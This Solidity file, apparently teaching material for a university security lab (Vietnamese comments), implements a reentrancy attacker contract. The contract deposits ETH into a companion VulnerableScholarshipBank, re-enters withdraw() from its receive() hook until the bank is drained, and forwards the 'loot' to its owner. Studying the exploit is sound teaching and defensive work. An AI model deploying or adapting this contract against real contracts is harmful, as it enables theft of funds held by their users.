// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableScholarshipBank.sol";

/**
 * @title AttackerScholarshipBank
 * @notice KHỞI TẠO MỤC ĐÍCH TRAINING / GIÁO DỤC - LAB 13 SECURITY EXPERIMENT.
 * @dev HỢP ĐỒNG MÔ PHỎNG KẺ TẤN CÔNG (MALICIOUS ATTACKER CONTRACT).
 *      Mục đích:
 *        1. Minh họa external call xảy ra trước state update trong VulnerableScholarshipBank.
 *        2. Hook vào hàm `receive()` khi ngân hàng gửi ETH để gọi lại (reenter) hàm `withdraw()`.
 *        3. Rút cạn toàn bộ số dư của quỹ ngân hàng học bổng mục tiêu.
 */
contract AttackerScholarshipBank {
    VulnerableScholarshipBank public immutable targetBank;
    address public immutable owner;

    // Biến đếm số lần tái nhập thành công (Reentrancy Depth)
    uint256 public attackCount;

    // Số tiền tấn công mỗi đợt nạp
    uint256 public initialDeposit;

    event AttackStarted(address indexed attacker, uint256 initialDeposit);
    event ReentrancyHookTriggered(uint256 count, uint256 targetBalanceLeft);
    event AttackCompleted(uint256 totalDrained, uint256 reentrancyIterations);

    constructor(address payable _targetBank) {
        targetBank = VulnerableScholarshipBank(_targetBank);
        owner = msg.sender;
    }

    /**
     * @notice Kích hoạt chuỗi tấn công Reentrancy
     * @dev Nạp một khoản ETH nhỏ vào ngân hàng mục tiêu, sau đó lập tức gọi withdraw()
     */
    function attack() external payable {
        require(msg.sender == owner, "Only owner can start attack");
        require(msg.value > 0, "Must supply ETH to perform initial deposit");

        initialDeposit = msg.value;
        attackCount = 0;

        emit AttackStarted(address(this), msg.value);

        // [1] Nạp tiền để hợp đồng ngân hàng ghi nhận balance cho địa chỉ Attacker
        targetBank.deposit{value: msg.value}();

        // [2] Bắt đầu kích hoạt rút tiền
        // Giao dịch này sẽ gọi receive() của Attacker trước khi target kịp update balances = 0
        targetBank.withdraw();

        emit AttackCompleted(address(this).balance, attackCount);
    }

    /**
     * @notice Hook nhận ETH - Điểm cốt lõi của Reentrancy Attack
     * @dev Khi VulnerableScholarshipBank thực hiện external call:
     *      `msg.sender.call{value: amount}("")`, quyền điều khiển rơi vào đây.
     *      Vì target chưa cập nhật `balances[this] = 0`, attacker gọi tiếp `withdraw()`.
     */
    receive() external payable {
        attackCount++;
        emit ReentrancyHookTriggered(attackCount, address(targetBank).balance);

        // Điều kiện dừng: Tiếp tục gọi rút nếu target vẫn còn đủ ETH để rút
        if (address(targetBank).balance >= initialDeposit) {
            targetBank.withdraw();
        }
    }

    /**
     * @notice Rút chiến lợi phẩm về ví chủ sở hữu
     */
    function withdrawLoot(address payable to) external {
        require(msg.sender == owner, "Only owner can withdraw loot");
        require(to != address(0), "Invalid recipient");
        uint256 balance = address(this).balance;
        (bool success, ) = to.call{value: balance}("");
        require(success, "Loot withdrawal failed");
    }

    /**
     * @notice Xem số dư Native ETH đang giữ trong hợp đồng tấn công
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
